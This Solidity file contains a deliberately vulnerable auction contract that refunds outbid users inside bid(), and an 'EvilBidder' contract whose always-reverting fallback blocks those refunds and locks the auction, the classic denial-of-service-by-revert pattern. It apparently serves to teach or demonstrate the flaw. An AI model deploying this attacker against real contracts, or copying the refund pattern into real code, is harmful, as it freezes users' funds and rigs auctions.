pragma solidity ^0.4.24;

contract Auction {
    address public highestBidder;
    uint highestBid;

    function bid() public payable {
        require(msg.value >= highestBid);
        if (highestBidder != 0) {
            highestBidder.transfer(highestBid);
        }
        highestBidder = msg.sender;
        highestBid = msg.value;
    }
}

// evil contract
contract EvilBidder {
    function() payable {
        revert();
    }

    function bid(address _to) public payable {
        if(!_to.call.value(msg.value)(bytes4(sha3("bid()")))) {
        }
    }
}
